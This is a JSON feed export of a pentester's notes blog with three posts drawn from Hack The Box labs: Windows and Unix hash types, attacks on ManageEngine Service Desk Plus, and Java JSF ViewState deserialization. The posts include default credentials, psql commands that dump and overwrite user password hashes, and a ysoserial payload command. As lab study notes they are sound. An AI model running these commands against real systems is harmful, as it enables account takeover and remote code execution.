            "id": "https://mvineza.github.io/spindel/2022/04/07/hashes",
            "title": "Hashes",
            "summary": "Hashes",
            "content_text": "Determining Hash Type# using hashid# -m -- displays equivalent mode for hashcathashid -m '$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/'# hashi-identifierhash-identifier  Alternatives:          https://github.com/SmeegeSec/HashTag.git      NTLM# LM - oldest way of storing password299BD128C1101FD6# NThash - newer format of storing passwordB4B9B02E6F09A9BD760F388B67351E2B# NTLMv1# - aka Net NTLM or NTLM# - a protocol (not a hash)# - uses LM and NT hashes (see example below)# - you can use this in pass the hash attacks# - you get this from SAM (local) or NTDS (domain controller)# - aad3b435b51404eeaad3b435b51404ee (1st part, LM)# - 0e0363213e37b94221497260b0bcb4fc (2nd part, NT)Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::# NTLMv2# - similar to NTLMv1# - but harder to crack# - cannot be used for pass the hash attack since its#   time based challenge responseenterprise-security::VULNNET:8b856f99a4f56574:3A6E6B90770F93843A6165D65C6CFECB:0101000000000000805DD83722A8D701732DB60C452305CF0000000002000800330054004E00380001001E00570049004E002D003500570031004B0044003500500030004A003800560004003400570049004E002D003500570031004B0044003500500030004A00380056002E00330054004E0038002E004C004F00430041004C0003001400330054004E0038002E004C004F00430041004C0005001400330054004E0038002E004C004F00430041004C0007000800805DD83722A8D70106000400020000000800300030000000000000000000000000300000ED09696FFCBE70BE87097AB6EC544650C2EDD2CF2ADF7CA7ECAF5424D119C3C40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310031002E00340030002E00330033000000000000000000  Based from HTB bastion, if LM hash starts with aad3b and NT hash starts with 31d6, that means both hashes are blank which most probably means Administrator account is disabled.  LM hash is normally blank out but not NT hash  Cracking LM Hash ExplanationBcrypt  Very hard to crack  You may be able to crack it via [[Hashcat]] if you use a rule file$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgWApache MD5$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/SHA1SUM  40 charactersecho test | sha1sumOther resources  Practical Usage of NTLM Hashes - ropnop blog                              [LM, NTLM, Net-NTLMv2, oh my!. A Pentester’s Guide to Windows Hashes          by Péter Gombos          Medium](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)                      example_hashes    hashcat wiki  NTLM vs. NTLMv1/v2 a.ka. Net-NTLMv1/v2 · CTF2",
            "content_html": "<h1 id=\"determining-hash-type\">Determining Hash Type</h1><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># using hashid</span><span class=\"c\"># -m -- displays equivalent mode for hashcat</span>hashid <span class=\"nt\">-m</span> <span class=\"s1\">'$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/'</span><span class=\"c\"># hashi-identifier</span>hash-identifier</code></pre></div></div><ul>  <li>Alternatives:    <ul>      <li>https://github.com/SmeegeSec/HashTag.git</li>    </ul>  </li></ul><h1 id=\"ntlm\">NTLM</h1><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># LM - oldest way of storing password</span>299BD128C1101FD6<span class=\"c\"># NThash - newer format of storing password</span>B4B9B02E6F09A9BD760F388B67351E2B<span class=\"c\"># NTLMv1</span><span class=\"c\"># - aka Net NTLM or NTLM</span><span class=\"c\"># - a protocol (not a hash)</span><span class=\"c\"># - uses LM and NT hashes (see example below)</span><span class=\"c\"># - you can use this in pass the hash attacks</span><span class=\"c\"># - you get this from SAM (local) or NTDS (domain controller)</span><span class=\"c\"># - aad3b435b51404eeaad3b435b51404ee (1st part, LM)</span><span class=\"c\"># - 0e0363213e37b94221497260b0bcb4fc (2nd part, NT)</span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::<span class=\"c\"># NTLMv2</span><span class=\"c\"># - similar to NTLMv1</span><span class=\"c\"># - but harder to crack</span><span class=\"c\"># - cannot be used for pass the hash attack since its</span><span class=\"c\">#   time based challenge response</span>enterprise-security::VULNNET:8b856f99a4f56574:3A6E6B90770F93843A6165D65C6CFECB:0101000000000000805DD83722A8D701732DB60C452305CF0000000002000800330054004E00380001001E00570049004E002D003500570031004B0044003500500030004A003800560004003400570049004E002D003500570031004B0044003500500030004A00380056002E00330054004E0038002E004C004F00430041004C0003001400330054004E0038002E004C004F00430041004C0005001400330054004E0038002E004C004F00430041004C0007000800805DD83722A8D70106000400020000000800300030000000000000000000000000300000ED09696FFCBE70BE87097AB6EC544650C2EDD2CF2ADF7CA7ECAF5424D119C3C40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310031002E00340030002E00330033000000000000000000</code></pre></div></div><ul>  <li>Based from <a href=\"https://www.youtube.com/watch?v=2j3FNp5pjQ4\">HTB bastion</a>, if LM hash starts with <code class=\"language-plaintext highlighter-rouge\">aad3b</code> and NT hash starts with <code class=\"language-plaintext highlighter-rouge\">31d6</code>, that means both hashes are blank which most probably means Administrator account is disabled.</li>  <li>LM hash is normally blank out but not NT hash</li>  <li><a href=\"https://www.youtube.com/watch?v=ZfPVGJGkORQ&amp;t=2085s\">Cracking LM Hash Explanation</a></li></ul><h1 id=\"bcrypt\">Bcrypt</h1><ul>  <li>Very hard to crack</li>  <li>You may be able to crack it via [[Hashcat]] if you use a rule file</li></ul><p><img src=\"/spindel/assets/Hashes/B8838698-C3F8-4F80-9B66-55B52BEF9CB8.png\" alt=\"\" /></p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW</code></pre></div></div><h1 id=\"apache-md5\">Apache MD5</h1><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/</code></pre></div></div><h1 id=\"sha1sum\">SHA1SUM</h1><ul>  <li>40 characters</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo test</span> | <span class=\"nb\">sha1sum</span></code></pre></div></div><h1 id=\"other-resources\">Other resources</h1><ul>  <li><a href=\"https://blog.ropnop.com/practical-usage-of-ntlm-hashes/\">Practical Usage of NTLM Hashes - ropnop blog</a></li>  <li>    <table>      <tbody>        <tr>          <td>[LM, NTLM, Net-NTLMv2, oh my!. A Pentester’s Guide to Windows Hashes</td>          <td>by Péter Gombos</td>          <td>Medium](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">example_hashes    hashcat wiki</a></li>  <li><a href=\"https://d00mfist1.gitbooks.io/ctf/content/identify_hash_and_crack_it/ntlm-vs-ntlmv1v2-aka-net-ntlmv1v2.html\">NTLM vs. NTLMv1/v2 a.ka. Net-NTLMv1/v2 · CTF2</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/07/hashes",
            
            
            
            "tags": ["windows","linux","crypto"],
            
            "date_published": "2022-04-07T00:00:00+08:00",
            "date_modified": "2022-04-07T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/06/manageengine-service-desk-plus-sdp",
            "title": "ManageEngine Service Desk Plus (SDP)",
            "summary": "ManageEngine Service Desk Plus (SDP)",
            "content_text": "Credentials# defaultadministrator:administrator# guestguest:guestVersion  On login screenPort  8080/tcp  8081/tcp - NIO port?Interesting URL Paths# Mobie formhttp://examplesite.com:8080/mcRecon  Check suspicious tickets both open and closed. You might find some confidential information such as credentials.Attacks  Privilege escalation (CVE-2019-10008) - If you are having issue, try manually logging in first as guest and execute the exploit from cli.  Craeate a custom triggers that will execute command when a ticket is created (you need a valid admin account).  XXE. Looks like this also works for 9.3  Example attack path from HTB HelplineDatabase  Postgres DB runs on port 65432/tcp  No way to recover current password, but you can do hard reset I think  Here is a query to enumerate users/psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c \"select * from aaauser\"./psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c \"select aaauser.first_name, aaapassword.password from aaauser, aaapassword where aaauser.user_id = aaapassword.password_id \"  Updates user password# password: $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG# salt: $2a$12$6VGARvoc/dRcRxOckr6Wmu# NOTE:# - We use backticks here to escape `$`. If not, the command#   will fail../psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c \"update aaapassword set password='`$2a`$12`$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', salt='`$2a`$12`$6VGARvoc/dRcRxOckr6Wmu' where password_id = 2;\"References  HTB Helpline",
            "content_html": "<h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># default</span>administrator:administrator<span class=\"c\"># guest</span>guest:guest</code></pre></div></div><h2 id=\"version\">Version</h2><ul>  <li>On login screen</li></ul><p><img src=\"/spindel/assets/ManageEngine%20Service%20Desk%20Plus%20(SDP)/DD11A72A-B0B0-45BF-9BCD-3930BE287268.png\" alt=\"\" /></p><h2 id=\"port\">Port</h2><ul>  <li>8080/tcp</li>  <li>8081/tcp - NIO port?</li></ul><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Mobie form</span>http://examplesite.com:8080/mc</code></pre></div></div><h2 id=\"recon\">Recon</h2><ul>  <li>Check suspicious tickets both open and closed. You might find some confidential information such as credentials.</li></ul><h2 id=\"attacks\">Attacks</h2><ul>  <li><a href=\"https://packetstormsecurity.com/files/152401/Manage-Engine-ServiceDesk-Plus-9.3-Privilege-Escalation.html\">Privilege escalation (CVE-2019-10008)</a> - If you are having issue, try manually logging in first as guest and execute the exploit from cli.</li>  <li>Craeate a custom triggers that will execute command when a ticket is created (you need a valid admin account).</li></ul><p><img src=\"/spindel/assets/ManageEngine%20Service%20Desk%20Plus%20(SDP)/03EE1597-CCC0-4F70-9782-95E82A327021.png\" alt=\"\" /></p><ul>  <li><a href=\"https://labs.integrity.pt/advisories/cve-2017-9362/index.html\">XXE</a>. Looks like this also works for 9.3</li>  <li>Example attack path from <a href=\"https://0xdf.gitlab.io/2019/08/17/htb-helpline.html\">HTB Helpline</a></li></ul><p><img src=\"/spindel/assets/ManageEngine%20Service%20Desk%20Plus%20(SDP)/helpline-flow.png\" alt=\"\" /></p><h2 id=\"database\">Database</h2><ul>  <li>Postgres DB runs on port <code class=\"language-plaintext highlighter-rouge\">65432/tcp</code></li>  <li>No way to recover current password, but you can do hard reset I think</li>  <li>Here is a query to enumerate users</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">/psql.exe</span><span class=\"w\"> </span><span class=\"nt\">-h</span><span class=\"w\"> </span><span class=\"nx\">127.0.0.1</span><span class=\"w\"> </span><span class=\"nt\">-p</span><span class=\"w\"> </span><span class=\"nx\">65432</span><span class=\"w\"> </span><span class=\"nt\">-U</span><span class=\"w\"> </span><span class=\"nx\">postgres</span><span class=\"w\"> </span><span class=\"nt\">-d</span><span class=\"w\"> </span><span class=\"nx\">servicedesk</span><span class=\"w\"> </span><span class=\"nt\">-c</span><span class=\"w\"> </span><span class=\"s2\">\"select * from aaauser\"</span><span class=\"w\"></span><span class=\"o\">.</span><span class=\"n\">/psql.exe</span><span class=\"w\"> </span><span class=\"nt\">-h</span><span class=\"w\"> </span><span class=\"nx\">127.0.0.1</span><span class=\"w\"> </span><span class=\"nt\">-p</span><span class=\"w\"> </span><span class=\"nx\">65432</span><span class=\"w\"> </span><span class=\"nt\">-U</span><span class=\"w\"> </span><span class=\"nx\">postgres</span><span class=\"w\"> </span><span class=\"nt\">-d</span><span class=\"w\"> </span><span class=\"nx\">servicedesk</span><span class=\"w\"> </span><span class=\"nt\">-c</span><span class=\"w\"> </span><span class=\"s2\">\"select aaauser.first_name, aaapassword.password from aaauser, aaapassword where aaauser.user_id = aaapassword.password_id \"</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Updates user password</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># password: $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG</span><span class=\"w\"></span><span class=\"c\"># salt: $2a$12$6VGARvoc/dRcRxOckr6Wmu</span><span class=\"w\"></span><span class=\"c\"># NOTE:</span><span class=\"w\"></span><span class=\"c\"># - We use backticks here to escape `$`. If not, the command</span><span class=\"w\"></span><span class=\"c\">#   will fail.</span><span class=\"w\"></span><span class=\"o\">.</span><span class=\"n\">/psql.exe</span><span class=\"w\"> </span><span class=\"nt\">-h</span><span class=\"w\"> </span><span class=\"nx\">127.0.0.1</span><span class=\"w\"> </span><span class=\"nt\">-p</span><span class=\"w\"> </span><span class=\"nx\">65432</span><span class=\"w\"> </span><span class=\"nt\">-U</span><span class=\"w\"> </span><span class=\"nx\">postgres</span><span class=\"w\"> </span><span class=\"nt\">-w</span><span class=\"w\"> </span><span class=\"nt\">-d</span><span class=\"w\"> </span><span class=\"nx\">servicedesk</span><span class=\"w\"> </span><span class=\"nt\">-c</span><span class=\"w\"> </span><span class=\"s2\">\"update aaapassword set password='</span><span class=\"se\">`$</span><span class=\"s2\">2a</span><span class=\"se\">`$</span><span class=\"s2\">12</span><span class=\"se\">`$</span><span class=\"s2\">6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', salt='</span><span class=\"se\">`$</span><span class=\"s2\">2a</span><span class=\"se\">`$</span><span class=\"s2\">12</span><span class=\"se\">`$</span><span class=\"s2\">6VGARvoc/dRcRxOckr6Wmu' where password_id = 2;\"</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://0xdf.gitlab.io/2019/08/17/htb-helpline.html\">HTB Helpline</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/06/manageengine-service-desk-plus-sdp",
            
            
            
            "tags": ["windows","enum","java","postgres"],
            
            "date_published": "2022-04-06T00:00:00+08:00",
            "date_modified": "2022-04-06T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/05/java-jsf-viewstate-deserialization",
            "title": "Java JSF ViewState Deserialization",
            "summary": "Java JSF ViewState Deserialization",
            "content_text": "Viewstate  Maintains states between postbacks  Can be stored on client or server side. This is controlled by javax.faces.STATE_SAVING_METHOD settings.  There are 2 major implementatons:          Oracle Mojarra (JSF reference implementation)      Apache MyFaces        Can also be encrypted. base64-encoded keys are set by org.apache.myfaces.SECRET.  If viewstate starts with H4sIAAAA, it is base64 gzipViewstate StructureIt is a java.util.HashMap. Here is an example when generating a payload using ysoserial.`On a side note, java serialized objects starts with AC ED. Here is an example viewstate from HTB Arkham.b'\\xac\\xed\\x00\\x05ur\\x00\\x13[Ljava.lang.Object;\\x90\\xceX\\x9f\\x10s)l\\x02\\x00\\x00xp\\x00\\x00\\x00\\x03t\\x00\\x011pt\\x00\\x12/userSubscribe.jsp\\x02\\x02'Example Errors# error when providing invalid value to viewstatejavax.faces.application.ViewExpiredException: viewId:&amp;#47;userSubscribe.faces - No saved view state could be found for the view identifier: &amp;#47;userSubscribe.facesorg.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:88)org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)Injection Points# post dataj_id_jsp_1623871077_1%3Aemail=a&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState={PAYLOAD}Payload Gadgets and Affected Libraries  commons-collections-3.2.1.jar  commons-collections:3.1 - CommonsCollections7 in ysoserialPayloads# ysoserial, CommonsCollections7java -jar ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 \"ping 10.10.14.31\"java -jar ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 \"ping 10.10.14.31\" &gt; payload.datInteresting Files and Directories# config filesfaces-config.xmlweb.xmlInteresting URL Paths# JSF pages normally ends in .faces/{ANYTHING}.faces:8080/UserSubscribe.facesEncryption  Default algorithm is DES ECB mode  Viewstate can be encrypted. You can check for encyrption keys in this part of config files.&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;&lt;/context-param&gt;    &lt;context-param&gt;        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;     &lt;/context-param&gt;&lt;context-param&gt;&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;&lt;/context-param&gt;&lt;context-param&gt;  Here is an example encryption and decryption process using HmacSHA1# encryptionpayload -&gt; des_ecb_encrypt -&gt; hmac_sha1_sig -&gt; b64_encode -&gt; url_encode# decryptionvs -&gt; url_decode -&gt; b64_decode -&gt; hmac_sha1_unsig -&gt; des_ecb_decrypt  Python3 decryption# initialize&gt;&gt;&gt; vs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'# url_decode&gt;&gt;&gt; import urllib&gt;&gt;&gt; url_decoded = urllib.parse.unquote_plus(vs)&gt;&gt;&gt; url_decoded'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE='&gt;&gt;&gt; # b64_decode&gt;&gt;&gt; import base64&gt;&gt;&gt; b64_decoded = base64.b64decode(url_decoded)&gt;&gt;&gt; b64_decodedb'\\xc0z4\\xc2b\\xee\\xe5\\xc7\\x88\\xb4\\x88\\xbe#\\xb5\\xe4\\x12-F\\x01\\xbe!\\xd7e\\x99\\xf3\\xde)\\x03\\xe6x8~\\xdbr\\x8d\\xa3\\\\L\\xb5E\\x0cS\\xa8\\xb6.\\xa2I\\x8e\\xefB\\xad\\x0e\\xd9\\xe0\\x8c9\\xb4\\x98\\xdc\\xc0\\xf6\\xa1\\xe3a\\xea\\xf1\\xa3H\\xd6\\xef;\\xb5\\x99\\xd2\\x81^\\xdcgOTf\\x9de\\x16L\\x9c\\x82\\xb8\\xd7\\t\\xbb\\x11'&gt;&gt;&gt; # hmac_sha1_unsig - separate message and tag (mac)#  tag     = last 20 bytes#  message = whole signature - last 20 bytes&gt;&gt;&gt; t_bytes = b64_decoded[-20:]&gt;&gt;&gt; m_bytes = b64_decoded[:-20]&gt;&gt;&gt; t_bytesb'\\x99\\xd2\\x81^\\xdcgOTf\\x9de\\x16L\\x9c\\x82\\xb8\\xd7\\t\\xbb\\x11'&gt;&gt;&gt; m_bytesb'\\xc0z4\\xc2b\\xee\\xe5\\xc7\\x88\\xb4\\x88\\xbe#\\xb5\\xe4\\x12-F\\x01\\xbe!\\xd7e\\x99\\xf3\\xde)\\x03\\xe6x8~\\xdbr\\x8d\\xa3\\\\L\\xb5E\\x0cS\\xa8\\xb6.\\xa2I\\x8e\\xefB\\xad\\x0e\\xd9\\xe0\\x8c9\\xb4\\x98\\xdc\\xc0\\xf6\\xa1\\xe3a\\xea\\xf1\\xa3H\\xd6\\xef;\\xb5'&gt;&gt;&gt; # des_ecb_decrypt - here you see the actual java serialized# object which starts with \"\\xac\\xed\". It also includes the# URL path associated with the object which is:#   /userSubscribe.jsp&gt;&gt;&gt; from Crypto.Cipher import DES&gt;&gt;&gt; k = b'JsF9876-'&gt;&gt;&gt; crypter = DES.new(k, DES.MODE_ECB)&gt;&gt;&gt; crypter.decrypt(m_bytes)b'\\xac\\xed\\x00\\x05ur\\x00\\x13[Ljava.lang.Object;\\x90\\xceX\\x9f\\x10s)l\\x02\\x00\\x00xp\\x00\\x00\\x00\\x03t\\x00\\x011pt\\x00\\x12/userSubscribe.jsp\\x02\\x02'&gt;&gt;&gt; Tools  Online viewstate decoderReferences  Hacktricks - JSF Deserialization  JSF ViewState upside-down  Demystifying Insecure Deserialisation on JSF Application  Secure Your Application - MYFACES2 - Apache Software Foundation  HTB Arkham",
            "content_html": "<h2 id=\"viewstate\">Viewstate</h2><ul>  <li>Maintains states between postbacks</li>  <li>Can be stored on client or server side. This is controlled by <code class=\"language-plaintext highlighter-rouge\">javax.faces.STATE_SAVING_METHOD</code> settings.</li>  <li>There are 2 major implementatons:    <ul>      <li>Oracle Mojarra (JSF reference implementation)</li>      <li>Apache MyFaces</li>    </ul>  </li>  <li>Can also be encrypted. base64-encoded keys are set by <code class=\"language-plaintext highlighter-rouge\">org.apache.myfaces.SECRET</code>.</li>  <li>If viewstate starts with <code class=\"language-plaintext highlighter-rouge\">H4sIAAAA</code>, it is base64 gzip</li></ul><h2 id=\"viewstate-structure\">Viewstate Structure</h2><p>It is a <code class=\"language-plaintext highlighter-rouge\">java.util.HashMap</code>. Here is an example when generating a payload using ysoserial.</p><p>`</p><p>On a side note, java serialized objects starts with <code class=\"language-plaintext highlighter-rouge\">AC ED</code>. Here is an example viewstate from HTB Arkham.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>b'\\xac\\xed\\x00\\x05ur\\x00\\x13[Ljava.lang.Object;\\x90\\xceX\\x9f\\x10s)l\\x02\\x00\\x00xp\\x00\\x00\\x00\\x03t\\x00\\x011pt\\x00\\x12/userSubscribe.jsp\\x02\\x02'</code></pre></div></div><h2 id=\"example-errors\">Example Errors</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># error when providing invalid value to viewstate</span>javax.faces.application.ViewExpiredException: viewId:&amp;#47<span class=\"p\">;</span>userSubscribe.faces - No saved view state could be found <span class=\"k\">for </span>the view identifier: &amp;#47<span class=\"p\">;</span>userSubscribe.facesorg.apache.myfaces.lifecycle.RestoreViewExecutor.execute<span class=\"o\">(</span>RestoreViewExecutor.java:88<span class=\"o\">)</span>org.apache.myfaces.lifecycle.LifecycleImpl.executePhase<span class=\"o\">(</span>LifecycleImpl.java:103<span class=\"o\">)</span>org.apache.myfaces.lifecycle.LifecycleImpl.execute<span class=\"o\">(</span>LifecycleImpl.java:76<span class=\"o\">)</span>javax.faces.webapp.FacesServlet.service<span class=\"o\">(</span>FacesServlet.java:244<span class=\"o\">)</span>org.apache.tomcat.websocket.server.WsFilter.doFilter<span class=\"o\">(</span>WsFilter.java:52<span class=\"o\">)</span></code></pre></div></div><h2 id=\"injection-points\">Injection Points</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># post data</span>j_id_jsp_1623871077_1%3Aemail<span class=\"o\">=</span>a&amp;j_id_jsp_1623871077_1%3Asubmit<span class=\"o\">=</span>SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT<span class=\"o\">=</span>1&amp;javax.faces.ViewState<span class=\"o\">={</span>PAYLOAD<span class=\"o\">}</span></code></pre></div></div><h2 id=\"payload-gadgets-and-affected-libraries\">Payload Gadgets and Affected Libraries</h2><ul>  <li>commons-collections-3.2.1.jar</li>  <li>commons-collections:3.1 - CommonsCollections7 in ysoserial</li></ul><h2 id=\"payloads\">Payloads</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># ysoserial, CommonsCollections7</span>java <span class=\"nt\">-jar</span> ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 <span class=\"s2\">\"ping 10.10.14.31\"</span>java <span class=\"nt\">-jar</span> ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 <span class=\"s2\">\"ping 10.10.14.31\"</span> <span class=\"o\">&gt;</span> payload.dat</code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># config files</span>faces-config.xmlweb.xml</code></pre></div></div><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># JSF pages normally ends in .faces</span>/<span class=\"o\">{</span>ANYTHING<span class=\"o\">}</span>.faces:8080/UserSubscribe.faces</code></pre></div></div><h2 id=\"encryption\">Encryption</h2><ul>  <li>Default algorithm is <code class=\"language-plaintext highlighter-rouge\">DES ECB mode</code></li>  <li>Viewstate can be encrypted. You can check for encyrption keys in this part of config files.</li></ul><div class=\"language-xml highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;param-name&gt;</span>org.apache.myfaces.SECRET<span class=\"nt\">&lt;/param-name&gt;</span><span class=\"nt\">&lt;param-value&gt;</span>SnNGOTg3Ni0=<span class=\"nt\">&lt;/param-value&gt;</span><span class=\"nt\">&lt;/context-param&gt;</span>    <span class=\"nt\">&lt;context-param&gt;</span>        <span class=\"nt\">&lt;param-name&gt;</span>org.apache.myfaces.MAC_ALGORITHM<span class=\"nt\">&lt;/param-name&gt;</span>        <span class=\"nt\">&lt;param-value&gt;</span>HmacSHA1<span class=\"nt\">&lt;/param-value&gt;</span>     <span class=\"nt\">&lt;/context-param&gt;</span><span class=\"nt\">&lt;context-param&gt;</span><span class=\"nt\">&lt;param-name&gt;</span>org.apache.myfaces.MAC_SECRET<span class=\"nt\">&lt;/param-name&gt;</span><span class=\"nt\">&lt;param-value&gt;</span>SnNGOTg3Ni0=<span class=\"nt\">&lt;/param-value&gt;</span><span class=\"nt\">&lt;/context-param&gt;</span><span class=\"nt\">&lt;context-param&gt;</span></code></pre></div></div><ul>  <li>Here is an <a href=\"https://0xdf.gitlab.io/2019/08/10/htb-arkham.html#decrypt-viewstate\">example</a> encryption and decryption process using <code class=\"language-plaintext highlighter-rouge\">HmacSHA1</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># encryption</span>payload -&gt; des_ecb_encrypt -&gt; hmac_sha1_sig -&gt; b64_encode -&gt; url_encode<span class=\"c\"># decryption</span>vs -&gt; url_decode -&gt; b64_decode -&gt; hmac_sha1_unsig -&gt; des_ecb_decrypt</code></pre></div></div><ul>  <li>Python3 decryption</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\"># initialize</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">vs</span> <span class=\"o\">=</span> <span class=\"s\">'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'</span><span class=\"c1\"># url_decode</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">import</span> <span class=\"nn\">urllib</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">url_decoded</span> <span class=\"o\">=</span> <span class=\"n\">urllib</span><span class=\"p\">.</span><span class=\"n\">parse</span><span class=\"p\">.</span><span class=\"n\">unquote_plus</span><span class=\"p\">(</span><span class=\"n\">vs</span><span class=\"p\">)</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">url_decoded</span><span class=\"s\">'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE='</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># b64_decode</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">import</span> <span class=\"nn\">base64</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">b64_decoded</span> <span class=\"o\">=</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"n\">b64decode</span><span class=\"p\">(</span><span class=\"n\">url_decoded</span><span class=\"p\">)</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">b64_decoded</span><span class=\"sa\">b</span><span class=\"s\">'</span><span class=\"se\">\\xc0</span><span class=\"s\">z4</span><span class=\"se\">\\xc2</span><span class=\"s\">b</span><span class=\"se\">\\xee\\xe5\\xc7\\x88\\xb4\\x88\\xbe</span><span 